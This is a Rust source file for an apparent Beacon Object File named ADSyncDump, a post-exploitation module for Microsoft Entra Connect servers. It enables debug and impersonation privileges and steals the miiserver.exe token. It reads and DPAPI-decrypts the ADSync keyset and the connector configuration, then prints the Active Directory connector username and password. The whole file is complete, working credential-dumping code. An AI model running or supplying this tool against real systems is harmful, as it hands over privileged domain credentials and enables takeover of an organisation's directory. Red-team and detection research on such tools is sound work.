//! # ADSyncDump BOF
//!
//! Recovers the on-premises Active Directory connector credential from a local
//! Microsoft Entra Connect server. It queries the local ADSync database, reads
//! and DPAPI-decrypts the matching keyset while impersonating `miiserver.exe`,
//! decrypts the connector configuration, and prints the connector username and
//! password. Run from a SYSTEM context on the Entra Connect server.
//!
//! Based on the MIT-licensed ADSyncDump-BOF by Luke Paris (Paradoxis), which in
//! turn references Dirk-jan Mollema's AD Connect research.
//!
//! ## MITRE ATT&CK
//! - T1003 - OS Credential Dumping
//! - T1555 - Credentials from Password Stores
//! - T1134.001 - Access Token Manipulation: Token Impersonation/Theft
//!
//! ## Arguments
//! None.

#![no_std]

use alloc::format;
use alloc::string::{String, ToString};
use alloc::vec;
use alloc::vec::Vec;
use core::ffi::c_void;
use core::mem::{size_of, zeroed};
use rustbof::{eprintln, println};

type Handle = isize;
type HCryptProv = usize;
type HCryptKey = usize;
type SqlHandle = *mut c_void;
type SqlReturn = i16;
type SqlSmallInt = i16;
type SqlUSmallInt = u16;
type SqlInteger = i32;
type SqlLen = isize;

const INVALID_HANDLE_VALUE: Handle = -1;
const TH32CS_SNAPPROCESS: u32 = 0x0000_0002;
const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;
const TOKEN_ASSIGN_PRIMARY: u32 = 0x0001;
const TOKEN_DUPLICATE: u32 = 0x0002;
const TOKEN_IMPERSONATE: u32 = 0x0004;
const TOKEN_QUERY: u32 = 0x0008;
const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
const SE_PRIVILEGE_ENABLED: u32 = 0x0000_0002;
const SECURITY_IMPERSONATION: i32 = 2;
const TOKEN_IMPERSONATION: i32 = 2;
const ERROR_NOT_ALL_ASSIGNED: u32 = 1300;

const SQL_SUCCESS: SqlReturn = 0;
const SQL_SUCCESS_WITH_INFO: SqlReturn = 1;
const SQL_NO_DATA: SqlReturn = 100;
const SQL_HANDLE_ENV: SqlSmallInt = 1;
const SQL_HANDLE_DBC: SqlSmallInt = 2;
const SQL_HANDLE_STMT: SqlSmallInt = 3;
const SQL_ATTR_ODBC_VERSION: SqlInteger = 200;
const SQL_OV_ODBC3: usize = 3;
const SQL_LOGIN_TIMEOUT: SqlInteger = 103;
const SQL_DRIVER_NOPROMPT: u16 = 0;
const SQL_NTS: SqlInteger = -3;
const SQL_C_CHAR: SqlSmallInt = 1;
const SQL_C_LONG: SqlSmallInt = 4;
const SQL_C_GUID: SqlSmallInt = -11;
const SQL_NULL_DATA: SqlLen = -1;
const SQL_NO_TOTAL: SqlLen = -4;

const CRED_TYPE_GENERIC: u32 = 1;
const CRYPT_STRING_BASE64: u32 = 1;
const CRYPTPROTECT_UI_FORBIDDEN: u32 = 1;
const CRYPTPROTECT_LOCAL_MACHINE: u32 = 4;
const PROV_RSA_AES: u32 = 24;
const CRYPT_VERIFYCONTEXT: u32 = 0xF000_0000;
const KP_IV: u32 = 1;
const KP_MODE: u32 = 4;
const CRYPT_MODE_CBC: u32 = 1;

const CONFIG_CAPACITY: usize = 128 * 1024;
const DRIVER_CAPACITY: usize = 4096;
const MAX_ROWS: usize = 64;
const KEY_OFFSET: usize = 88;
const KEY_BLOB_SIZE: usize = 44;
const IV_OFFSET: usize = 8;
const IV_LENGTH: usize = 16;
const CONNECT_TIMEOUT: usize = 5;

const QUERY_KEY_METADATA: &str =
    "SELECT instance_id, keyset_id, entropy FROM mms_server_configuration;";
const QUERY_KEY_MATERIAL: &str =
    "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;";

#[repr(C)]
#[derive(Clone, Copy)]
struct Luid {
    low_part: u32,
    high_part: i32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct LuidAndAttributes {
    luid: Luid,
    attributes: u32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct TokenPrivilegesOne {
    privilege_count: u32,
    privileges: [LuidAndAttributes; 1],
}

#[repr(C)]
struct ProcessEntry32W {
    size: u32,
    usage: u32,
    process_id: u32,
    default_heap_id: usize,
    module_id: u32,
    threads: u32,
    parent_process_id: u32,
    base_priority: i32,
    flags: u32,
    executable: [u16; 260],
}

#[repr(C)]
#[derive(Clone, Copy)]
struct Guid {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [u8; 8],
}

#[repr(C)]
struct DataBlob {
    size: u32,
    data: *mut u8,
}

#[repr(C)]
struct FileTime {
    low: u32,
    high: u32,
}

#[repr(C)]
struct CredentialW {
    flags: u32,
    credential_type: u32,
    target_name: *mut u16,
    comment: *mut u16,
    last_written: FileTime,
    credential_blob_size: u32,
    credential_blob: *mut u8,
    persist: u32,
    attribute_count: u32,
    attributes: *mut c_void,
    target_alias: *mut u16,
    user_name: *mut u16,
}

unsafe extern "system" {
    fn GetLastError() -> u32;
    fn SetLastError(error: u32);
    fn GetCurrentProcess() -> Handle;
    fn CreateToolhelp32Snapshot(flags: u32, process_id: u32) -> Handle;
    fn Process32FirstW(snapshot: Handle, entry: *mut ProcessEntry32W) -> i32;
    fn Process32NextW(snapshot: Handle, entry: *mut ProcessEntry32W) -> i32;
    fn OpenProcess(access: u32, inherit: i32, process_id: u32) -> Handle;
    fn CloseHandle(handle: Handle) -> i32;
    fn LocalFree(memory: *mut c_void) -> *mut c_void;

    fn OpenProcessToken(process: Handle, access: u32, token: *mut Handle) -> i32;
    fn LookupPrivilegeValueW(system: *const u16, name: *const u16, luid: *mut Luid) -> i32;
    fn AdjustTokenPrivileges(
        token: Handle,
        disable_all: i32,
        new_state: *const TokenPrivilegesOne,
        buffer_length: u32,
        previous_state: *mut TokenPrivilegesOne,
        return_length: *mut u32,
    ) -> i32;
    fn DuplicateTokenEx(
        token: Handle,
        access: u32,
        attributes: *const c_void,
        level: i32,
        token_type: i32,
        duplicate: *mut Handle,
    ) -> i32;
    fn SetThreadToken(thread: *const Handle, token: Handle) -> i32;
    fn RevertToSelf() -> i32;
    fn CredReadW(
        target: *const u16,
        credential_type: u32,
        flags: u32,
        credential: *mut *mut CredentialW,
    ) -> i32;
    fn CredFree(memory: *mut c_void);
    fn CryptAcquireContextW(
        provider: *mut HCryptProv,
        container: *const u16,
        provider_name: *const u16,
        provider_type: u32,
        flags: u32,
    ) -> i32;
    fn CryptImportKey(
        provider: HCryptProv,
        data: *const u8,
        data_length: u32,
        public_key: HCryptKey,
        flags: u32,
        key: *mut HCryptKey,
    ) -> i32;
    fn CryptSetKeyParam(key: HCryptKey, parameter: u32, data: *const u8, flags: u32) -> i32;
    fn CryptDecrypt(
        key: HCryptKey,
        hash: usize,
        final_block: i32,
        flags: u32,
        data: *mut u8,
        data_length: *mut u32,
    ) -> i32;
    fn CryptDestroyKey(key: HCryptKey) -> i32;
    fn CryptReleaseContext(provider: HCryptProv, flags: u32) -> i32;

    fn CryptUnprotectData(
        input: *const DataBlob,
        description: *mut *mut u16,
        entropy: *const DataBlob,
        reserved: *const c_void,
        prompt: *const c_void,
        flags: u32,
        output: *mut DataBlob,
    ) -> i32;
    fn CryptStringToBinaryA(
        value: *const u8,
        length: u32,
        flags: u32,
        output: *mut u8,
        output_length: *mut u32,
        skip: *mut u32,
        used_flags: *mut u32,
    ) -> i32;

    fn SQLGetInstalledDriversW(buffer: *mut u16, capacity: u16, output_length: *mut u16) -> i32;
    fn SQLAllocHandle(
        handle_type: SqlSmallInt,
        input: SqlHandle,
        output: *mut SqlHandle,
    ) -> SqlReturn;
    fn SQLFreeHandle(handle_type: SqlSmallInt, handle: SqlHandle) -> SqlReturn;
    fn SQLSetEnvAttr(
        environment: SqlHandle,
        attribute: SqlInteger,
        value: *mut c_void,
        length: SqlInteger,
    ) -> SqlReturn;
    fn SQLSetConnectAttrW(
        connection: SqlHandle,
        attribute: SqlInteger,
        value: *mut c_void,
        length: SqlInteger,
    ) -> SqlReturn;
    fn SQLDriverConnectW(
        connection: SqlHandle,
        window: *mut c_void,
        input: *const u16,
        input_length: SqlSmallInt,
        output: *mut u16,
        output_capacity: SqlSmallInt,
        output_length: *mut SqlSmallInt,
        completion: u16,
    ) -> SqlReturn;
    fn SQLDisconnect(connection: SqlHandle) -> SqlReturn;
    fn SQLExecDirectW(statement: SqlHandle, text: *const u16, length: SqlInteger) -> SqlReturn;
    fn SQLBindCol(
        statement: SqlHandle,
        column: SqlUSmallInt,
        target_type: SqlSmallInt,
        target: *mut c_void,
        capacity: SqlLen,
        indicator: *mut SqlLen,
    ) -> SqlReturn;
    fn SQLFetch(statement: SqlHandle) -> SqlReturn;
    fn SQLGetDiagRecW(
        handle_type: SqlSmallInt,
        handle: SqlHandle,
        record: SqlSmallInt,
        state: *mut u16,
        native_error: *mut SqlInteger,
        message: *mut u16,
        capacity: SqlSmallInt,
        output_length: *mut SqlSmallInt,
    ) -> SqlReturn;
}

fn sql_success(result: SqlReturn) -> bool {
    matches!(result, SQL_SUCCESS | SQL_SUCCESS_WITH_INFO)
}

fn wide(value: &str) -> Vec<u16> {
    value.encode_utf16().chain(core::iter::once(0)).collect()
}

fn wide_string(value: &[u16]) -> String {
    let length = value
        .iter()
        .position(|unit| *unit == 0)
        .unwrap_or(value.len());
    String::from_utf16_lossy(&value[..length])
}

fn utf16_bytes(value: &[u8]) -> Option<String> {
    if value.len() % 2 != 0 {
        return None;
    }
    let mut units = Vec::with_capacity(value.len() / 2);
    for pair in value.chunks_exact(2) {
        units.push(u16::from_le_bytes([pair[0], pair[1]]));
    }
    while units.last().copied() == Some(0) {
        units.pop();
    }
    Some(String::from_utf16_lossy(&units))
}

fn ascii_case_equal(left: &[u16], right: &str) -> bool {
    let length = left
        .iter()
        .position(|unit| *unit == 0)
        .unwrap_or(left.len());
    if length != right.len() {
        return false;
    }
    left[..length]
        .iter()
        .zip(right.as_bytes())
        .all(|(unit, byte)| (*unit as u8).eq_ignore_ascii_case(byte))
}

struct WinHandle(Handle);

impl WinHandle {
    fn new(value: Handle) -> Option<Self> {
        (value != 0 && value != INVALID_HANDLE_VALUE).then_some(Self(value))
    }
}

impl Drop for WinHandle {
    fn drop(&mut self) {
        unsafe { CloseHandle(self.0) };
    }
}

struct PrivilegeGuard {
    token: WinHandle,
    previous: TokenPrivilegesOne,
    previous_length: u32,
}

impl PrivilegeGuard {
    fn enable(name: &str) -> Result<Self, u32> {
        let mut token = 0;
        if unsafe {
            OpenProcessToken(
                GetCurrentProcess(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                &mut token,
            )
        } == 0
        {
            return Err(unsafe { GetLastError() });
        }
        let token = WinHandle::new(token).ok_or(6u32)?;
        let mut luid = Luid {
            low_part: 0,
            high_part: 0,
        };
        if unsafe { LookupPrivilegeValueW(core::ptr::null(), wide(name).as_ptr(), &mut luid) } == 0
        {
            return Err(unsafe { GetLastError() });
        }
        let desired = TokenPrivilegesOne {
            privilege_count: 1,
            privileges: [LuidAndAttributes {
                luid,
                attributes: SE_PRIVILEGE_ENABLED,
            }],
        };
        let mut previous = unsafe { zeroed::<TokenPrivilegesOne>() };
        let mut previous_length = 0u32;
        unsafe { SetLastError(0) };
        if unsafe {
            AdjustTokenPrivileges(
                token.0,
                0,
                &desired,
                size_of::<TokenPrivilegesOne>() as u32,
                &mut previous,
                &mut previous_length,
            )
        } == 0
        {
            return Err(unsafe { GetLastError() });
        }
        let error = unsafe { GetLastError() };
        if error == ERROR_NOT_ALL_ASSIGNED {
            return Err(error);
        }
        Ok(Self {
            token,
            previous,
            previous_length,
        })
    }
}

impl Drop for PrivilegeGuard {
    fn drop(&mut self) {
        if self.previous_length != 0 {
            unsafe {
                AdjustTokenPrivileges(
                    self.token.0,
                    0,
                    &self.previous,
                    0,
                    core::ptr::null_mut(),
                    core::ptr::null_mut(),
                )
            };
        }
    }
}

struct ImpersonationGuard;

impl Drop for ImpersonationGuard {
    fn drop(&mut self) {
        unsafe { RevertToSelf() };
    }
}

struct SqlResource {
    kind: SqlSmallInt,
    handle: SqlHandle,
    connected: bool,
}

impl SqlResource {
    fn allocate(kind: SqlSmallInt, parent: SqlHandle) -> Result<Self, SqlReturn> {
        let mut handle = core::ptr::null_mut();
        let result = unsafe { SQLAllocHandle(kind, parent, &mut handle) };
        if sql_success(result) && !handle.is_null() {
            Ok(Self {
                kind,
                handle,
                connected: false,
            })
        } else {
            Err(result)
        }
    }
}

impl Drop for SqlResource {
    fn drop(&mut self) {
        if self.connected {
            unsafe { SQLDisconnect(self.handle) };
        }
        unsafe { SQLFreeHandle(self.kind, self.handle) };
    }
}

struct Credential(*mut CredentialW);

impl Drop for Credential {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe { CredFree(self.0.cast()) };
        }
    }
}

struct LocalBlob(DataBlob);

impl Drop for LocalBlob {
    fn drop(&mut self) {
        if !self.0.data.is_null() {
            unsafe { LocalFree(self.0.data.cast()) };
        }
    }
}

struct CryptoProvider(HCryptProv);

impl Drop for CryptoProvider {
    fn drop(&mut self) {
        if self.0 != 0 {
            unsafe { CryptReleaseContext(self.0, 0) };
        }
    }
}

struct CryptoKey(HCryptKey);

impl Drop for CryptoKey {
    fn drop(&mut self) {
        if self.0 != 0 {
            unsafe { CryptDestroyKey(self.0) };
        }
    }
}

fn find_process(name: &str) -> Result<u32, u32> {
    let snapshot = WinHandle::new(unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) })
        .ok_or_else(|| unsafe { GetLastError() })?;
    let mut entry = unsafe { zeroed::<ProcessEntry32W>() };
    entry.size = size_of::<ProcessEntry32W>() as u32;
    if unsafe { Process32FirstW(snapshot.0, &mut entry) } == 0 {
        return Err(unsafe { GetLastError() });
    }
    loop {
        if ascii_case_equal(&entry.executable, name) {
            return Ok(entry.process_id);
        }
        if unsafe { Process32NextW(snapshot.0, &mut entry) } == 0 {
            break;
        }
    }
    Err(1168)
}

fn sql_diagnostic(kind: SqlSmallInt, handle: SqlHandle) -> String {
    let mut state = [0u16; 6];
    let mut message = [0u16; 1024];
    let mut native = 0i32;
    let mut length = 0i16;
    let result = unsafe {
        SQLGetDiagRecW(
            kind,
            handle,
            1,
            state.as_mut_ptr(),
            &mut native,
            message.as_mut_ptr(),
            message.len() as i16,
            &mut length,
        )
    };
    if !sql_success(result) {
        return String::from("no ODBC diagnostic was returned");
    }
    format!(
        "SQL state={} native={} message={}",
        wide_string(&state),
        native,
        wide_string(&message)
    )
}

fn installed_sql_driver() -> Result<String, u32> {
    let mut drivers = vec![0u16; DRIVER_CAPACITY];
    let mut used = 0u16;
    if unsafe {
        SQLGetInstalledDriversW(
            drivers.as_mut_ptr(),
            drivers.len().min(u16::MAX as usize) as u16,
            &mut used,
        )
    } == 0
    {
        return Err(unsafe { GetLastError() });
    }
    let limit = (used as usize).min(drivers.len());
    let mut offset = 0usize;
    while offset < limit {
        let length = drivers[offset..limit]
            .iter()
            .position(|unit| *unit == 0)
            .unwrap_or(limit - offset);
        if length == 0 {
            break;
        }
        let name = String::from_utf16_lossy(&drivers[offset..offset + length]);
        if name.contains("ODBC Driver ") && name.contains("for SQL Server") {
            return Ok(name);
        }
        offset += length + 1;
    }
    Err(1168)
}

fn guid_text(guid: &Guid) -> String {
    format!(
        "{{{:08x}-{:04x}-{:04x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}}}",
        guid.data1,
        guid.data2,
        guid.data3,
        guid.data4[0],
        guid.data4[1],
        guid.data4[2],
        guid.data4[3],
        guid.data4[4],
        guid.data4[5],
        guid.data4[6],
        guid.data4[7]
    )
}

fn html_unescape(value: &str) -> String {
    value
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&apos;", "'")
        .replace("&amp;", "&")
}

fn xml_value(xml: &str, marker: &str, end_tag: &str) -> Option<String> {
    let marker_offset = xml.find(marker)?;
    let value_start = xml[marker_offset..].find('>')? + marker_offset + 1;
    let value_end = xml[value_start..].find(end_tag)? + value_start;
    Some(html_unescape(xml[value_start..value_end].trim()))
}

fn find_username(xml: &str) -> Option<String> {
    xml_value(xml, "name=\"UserName\"", "</parameter>")
        .or_else(|| xml_value(xml, "name='UserName'", "</parameter>"))
}

fn find_password(xml: &str) -> Option<String> {
    xml_value(xml, "attribute name=\"Password\"", "</attribute>")
        .or_else(|| xml_value(xml, "attribute name='Password'", "</attribute>"))
        .or_else(|| xml_value(xml, "attribute name=\"password\"", "</attribute>"))
}

fn decode_base64(value: &[u8]) -> Result<Vec<u8>, u32> {
    let length = value
        .iter()
        .position(|byte| *byte == 0)
        .unwrap_or(value.len());
    if length == 0 || length > u32::MAX as usize {
        return Err(13);
    }
    let mut required = 0u32;
    if unsafe {
        CryptStringToBinaryA(
            value.as_ptr(),
            length as u32,
            CRYPT_STRING_BASE64,
            core::ptr::null_mut(),
            &mut required,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        )
    } == 0
    {
        return Err(unsafe { GetLastError() });
    }
    if required == 0 || required as usize > CONFIG_CAPACITY {
        return Err(13);
    }
    let mut output = vec![0u8; required as usize];
    if unsafe {
        CryptStringToBinaryA(
            value.as_ptr(),
            length as u32,
            CRYPT_STRING_BASE64,
            output.as_mut_ptr(),
            &mut required,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        )
    } == 0
    {
        return Err(unsafe { GetLastError() });
    }
    output.truncate(required as usize);
    Ok(output)
}

fn query_metadata(connection: SqlHandle) -> Result<(Guid, i32, Guid), String> {
    let statement = SqlResource::allocate(SQL_HANDLE_STMT, connection)
        .map_err(|result| format!("SQLAllocHandle(STMT) failed: {}", result))?;
    let query = wide(QUERY_KEY_METADATA);
    let result = unsafe { SQLExecDirectW(statement.handle, query.as_ptr(), SQL_NTS) };
    if !sql_success(result) {
        return Err(format!(
            "metadata query failed: {}",
            sql_diagnostic(SQL_HANDLE_STMT, statement.handle)
        ));
    }
    let mut instance = unsafe { zeroed::<Guid>() };
    let mut keyset = 0i32;
    let mut entropy = unsafe { zeroed::<Guid>() };
    for (column, target_type, target, capacity) in [
        (
            1,
            SQL_C_GUID,
            (&mut instance as *mut Guid).cast(),
            size_of::<Guid>() as SqlLen,
        ),
        (
            2,
            SQL_C_LONG,
            (&mut keyset as *mut i32).cast(),
            size_of::<i32>() as SqlLen,
        ),
        (
            3,
            SQL_C_GUID,
            (&mut entropy as *mut Guid).cast(),
            size_of::<Guid>() as SqlLen,
        ),
    ] {
        let result = unsafe {
            SQLBindCol(
                statement.handle,
                column,
                target_type,
                target,
                capacity,
                core::ptr::null_mut(),
            )
        };
        if !sql_success(result) {
            return Err(format!(
                "metadata column {} bind failed: {}",
                column, result
            ));
        }
    }
    let result = unsafe { SQLFetch(statement.handle) };
    if !sql_success(result) {
        return Err(format!("metadata row fetch failed: {}", result));
    }
    Ok((instance, keyset, entropy))
}

fn query_material(connection: SqlHandle) -> Result<(String, Vec<u8>), String> {
    let statement = SqlResource::allocate(SQL_HANDLE_STMT, connection)
        .map_err(|result| format!("SQLAllocHandle(STMT) failed: {}", result))?;
    let query = wide(QUERY_KEY_MATERIAL);
    let result = unsafe { SQLExecDirectW(statement.handle, query.as_ptr(), SQL_NTS) };
    if !sql_success(result) {
        return Err(format!(
            "configuration query failed: {}",
            sql_diagnostic(SQL_HANDLE_STMT, statement.handle)
        ));
    }
    let mut private = vec![0u8; CONFIG_CAPACITY];
    let mut encrypted = vec![0u8; CONFIG_CAPACITY];
    let mut private_length = 0isize;
    let mut encrypted_length = 0isize;
    let result = unsafe {
        SQLBindCol(
            statement.handle,
            1,
            SQL_C_CHAR,
            private.as_mut_ptr().cast(),
            private.len() as isize,
            &mut private_length,
        )
    };
    if !sql_success(result) {
        return Err(format!("private configuration bind failed: {}", result));
    }
    let result = unsafe {
        SQLBindCol(
            statement.handle,
            2,
            SQL_C_CHAR,
            encrypted.as_mut_ptr().cast(),
            encrypted.len() as isize,
            &mut encrypted_length,
        )
    };
    if !sql_success(result) {
        return Err(format!("encrypted configuration bind failed: {}", result));
    }

    for _ in 0..MAX_ROWS {
        let result = unsafe { SQLFetch(statement.handle) };
        if result == SQL_NO_DATA {
            break;
        }
        if !sql_success(result) {
            return Err(format!("configuration row fetch failed: {}", result));
        }
        if matches!(private_length, SQL_NULL_DATA | SQL_NO_TOTAL)
            || matches!(encrypted_length, SQL_NULL_DATA | SQL_NO_TOTAL)
            || private_length < 0
            || encrypted_length < 0
            || private_length as usize >= private.len()
            || encrypted_length as usize >= encrypted.len()
        {
            continue;
        }
        let private_text = core::str::from_utf8(&private[..private_length as usize])
            .ok()
            .map(ToString::to_string);
        if let Some(text) = private_text {
            if find_username(&text).is_some() {
                encrypted.truncate(encrypted_length as usize);
                return Ok((text, encrypted));
            }
        }
        private.fill(0);
        encrypted.fill(0);
    }
    Err(String::from(
        "no bounded ADSync connector row with a username was found",
    ))
}

fn decrypt_keyset(instance: &Guid, entropy: &Guid) -> Result<LocalBlob, u32> {
    let target = wide(&format!(
        "Microsoft_AzureADConnect_KeySet_{}_100000",
        guid_text(instance)
    ));
    let mut raw_credential = core::ptr::null_mut();
    if unsafe { CredReadW(target.as_ptr(), CRED_TYPE_GENERIC, 0, &mut raw_credential) } == 0 {
        return Err(unsafe { GetLastError() });
    }
    let credential = Credential(raw_credential);
    let entry = unsafe { &*credential.0 };
    if entry.credential_blob.is_null() || entry.credential_blob_size == 0 {
        return Err(13);
    }
    let encrypted = DataBlob {
        size: entry.credential_blob_size,
        data: entry.credential_blob,
    };
    let entropy_blob = DataBlob {
        size: size_of::<Guid>() as u32,
        data: (entropy as *const Guid).cast_mut().cast(),
    };
    let mut output = DataBlob {
        size: 0,
        data: core::ptr::null_mut(),
    };
    if unsafe {
        CryptUnprotectData(
            &encrypted,
            core::ptr::null_mut(),
            &entropy_blob,
            core::ptr::null(),
            core::ptr::null(),
            CRYPTPROTECT_LOCAL_MACHINE | CRYPTPROTECT_UI_FORBIDDEN,
            &mut output,
        )
    } == 0
    {
        return Err(unsafe { GetLastError() });
    }
    if output.data.is_null() || (output.size as usize) < KEY_OFFSET {
        unsafe { LocalFree(output.data.cast()) };
        return Err(13);
    }
    Ok(LocalBlob(output))
}

fn decrypt_configuration(keyset: &LocalBlob, encoded: &[u8]) -> Result<String, u32> {
    let decoded = decode_base64(encoded)?;
    if decoded.len() <= IV_OFFSET + IV_LENGTH {
        return Err(13);
    }
    let keyset_bytes =
        unsafe { core::slice::from_raw_parts(keyset.0.data, keyset.0.size as usize) };
    if keyset_bytes.len() < KEY_OFFSET {
        return Err(13);
    }
    let key_start = keyset_bytes.len() - KEY_OFFSET;
    let key_end = key_start + KEY_BLOB_SIZE;
    if key_end > keyset_bytes.len() {
        return Err(13);
    }

    let mut provider = 0usize;
    if unsafe {
        CryptAcquireContextW(
            &mut provider,
            core::ptr::null(),
            core::ptr::null(),
            PROV_RSA_AES,
            CRYPT_VERIFYCONTEXT,
        )
    } == 0
    {
        return Err(unsafe { GetLastError() });
    }
    let provider = CryptoProvider(provider);
    let mut key = 0usize;
    if unsafe {
        CryptImportKey(
            provider.0,
            keyset_bytes[key_start..key_end].as_ptr(),
            KEY_BLOB_SIZE as u32,
            0,
            0,
            &mut key,
        )
    } == 0
    {
        return Err(unsafe { GetLastError() });
    }
    let key = CryptoKey(key);
    let mode = CRYPT_MODE_CBC.to_le_bytes();
    if unsafe { CryptSetKeyParam(key.0, KP_MODE, mode.as_ptr(), 0) } == 0 {
        return Err(unsafe { GetLastError() });
    }
    if unsafe {
        CryptSetKeyParam(
            key.0,
            KP_IV,
            decoded[IV_OFFSET..IV_OFFSET + IV_LENGTH].as_ptr(),
            0,
        )
    } == 0
    {
        return Err(unsafe { GetLastError() });
    }
    let mut plaintext = decoded[IV_OFFSET + IV_LENGTH..].to_vec();
    if plaintext.is_empty() || plaintext.len() > u32::MAX as usize {
        return Err(13);
    }
    let mut plaintext_length = plaintext.len() as u32;
    if unsafe {
        CryptDecrypt(
            key.0,
            0,
            1,
            0,
            plaintext.as_mut_ptr(),
            &mut plaintext_length,
        )
    } == 0
    {
        return Err(unsafe { GetLastError() });
    }
    plaintext.truncate(plaintext_length as usize);
    utf16_bytes(&plaintext).ok_or(13)
}

#[rustbof::main]
fn main() {
    let _debug = match PrivilegeGuard::enable("SeDebugPrivilege") {
        Ok(value) => value,
        Err(error) => {
            eprintln!("Failed to enable SeDebugPrivilege: {}", error);
            return;
        }
    };
    let _impersonate = match PrivilegeGuard::enable("SeImpersonatePrivilege") {
        Ok(value) => value,
        Err(error) => {
            eprintln!("Failed to enable SeImpersonatePrivilege: {}", error);
            return;
        }
    };

    let process_id = match find_process("miiserver.exe") {
        Ok(value) => value,
        Err(error) => {
            eprintln!("miiserver.exe was not found: {}", error);
            return;
        }
    };
    println!("Found miiserver.exe with PID {}", process_id);

    let driver = match installed_sql_driver() {
        Ok(value) => value,
        Err(error) => {
            eprintln!("No supported SQL Server ODBC driver was found: {}", error);
            return;
        }
    };
    println!("Using ODBC driver: {}", driver);

    let environment = match SqlResource::allocate(SQL_HANDLE_ENV, core::ptr::null_mut()) {
        Ok(value) => value,
        Err(result) => {
            eprintln!("Failed to allocate the ODBC environment: {}", result);
            return;
        }
    };
    if !sql_success(unsafe {
        SQLSetEnvAttr(
            environment.handle,
            SQL_ATTR_ODBC_VERSION,
            SQL_OV_ODBC3 as *mut c_void,
            0,
        )
    }) {
        eprintln!("Failed to select ODBC version 3");
        return;
    }
    let mut connection = match SqlResource::allocate(SQL_HANDLE_DBC, environment.handle) {
        Ok(value) => value,
        Err(result) => {
            eprintln!("Failed to allocate the ODBC connection: {}", result);
            return;
        }
    };
    if !sql_success(unsafe {
        SQLSetConnectAttrW(
            connection.handle,
            SQL_LOGIN_TIMEOUT,
            CONNECT_TIMEOUT as *mut c_void,
            0,
        )
    }) {
        eprintln!("Failed to set the ODBC login timeout");
        return;
    }
    let connection_text = wide(&format!(
        "Driver={{{}}};Server=(LocalDB)\\.\\ADSync2019;Database=ADSync;Trusted_Connection=yes",
        driver
    ));
    let result = unsafe {
        SQLDriverConnectW(
            connection.handle,
            core::ptr::null_mut(),
            connection_text.as_ptr(),
            SQL_NTS as i16,
            core::ptr::null_mut(),
            0,
            core::ptr::null_mut(),
            SQL_DRIVER_NOPROMPT,
        )
    };
    if !sql_success(result) {
        eprintln!(
            "Failed to connect to the ADSync database: {}",
            sql_diagnostic(SQL_HANDLE_DBC, connection.handle)
        );
        return;
    }
    connection.connected = true;

    let (instance, keyset_id, entropy) = match query_metadata(connection.handle) {
        Ok(value) => value,
        Err(error) => {
            eprintln!("{}", error);
            return;
        }
    };
    println!(
        "ADSync metadata: instance={} entropy={} keyset=0x{:x}",
        guid_text(&instance),
        guid_text(&entropy),
        keyset_id
    );
    let (private_configuration, encrypted_configuration) = match query_material(connection.handle) {
        Ok(value) => value,
        Err(error) => {
            eprintln!("{}", error);
            return;
        }
    };

    let process = match WinHandle::new(unsafe {
        OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, process_id)
    }) {
        Some(value) => value,
        None => {
            eprintln!("Failed to open miiserver.exe: {}", unsafe {
                GetLastError()
            });
            return;
        }
    };
    let mut process_token = 0;
    if unsafe {
        OpenProcessToken(
            process.0,
            TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_IMPERSONATE,
            &mut process_token,
        )
    } == 0
    {
        eprintln!("Failed to open the miiserver.exe token: {}", unsafe {
            GetLastError()
        });
        return;
    }
    let process_token = match WinHandle::new(process_token) {
        Some(value) => value,
        None => return,
    };
    let mut duplicate = 0;
    if unsafe {
        DuplicateTokenEx(
            process_token.0,
            TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_IMPERSONATE,
            core::ptr::null(),
            SECURITY_IMPERSONATION,
            TOKEN_IMPERSONATION,
            &mut duplicate,
        )
    } == 0
    {
        eprintln!("Failed to duplicate the miiserver.exe token: {}", unsafe {
            GetLastError()
        });
        return;
    }
    let duplicate = match WinHandle::new(duplicate) {
        Some(value) => value,
        None => return,
    };
    if unsafe { SetThreadToken(core::ptr::null(), duplicate.0) } == 0 {
        eprintln!("Failed to impersonate miiserver.exe: {}", unsafe {
            GetLastError()
        });
        return;
    }
    let _revert = ImpersonationGuard;
    println!("Impersonated the miiserver.exe token");

    let keyset = match decrypt_keyset(&instance, &entropy) {
        Ok(value) => value,
        Err(error) => {
            eprintln!("Failed to read or decrypt the ADSync keyset: {}", error);
            return;
        }
    };
    let decrypted = match decrypt_configuration(&keyset, &encrypted_configuration) {
        Ok(value) => value,
        Err(error) => {
            eprintln!(
                "Failed to decrypt the ADSync connector configuration: {}",
                error
            );
            return;
        }
    };
    let username = match find_username(&private_configuration) {
        Some(value) => value,
        None => {
            eprintln!("The ADSync connector username was not found");
            return;
        }
    };
    let password = match find_password(&decrypted) {
        Some(value) => value,
        None => {
            eprintln!("The ADSync connector password was not found");
            return;
        }
    };
    println!("ADSync username: {}", username);
    println!("ADSync password: {}", password);
}
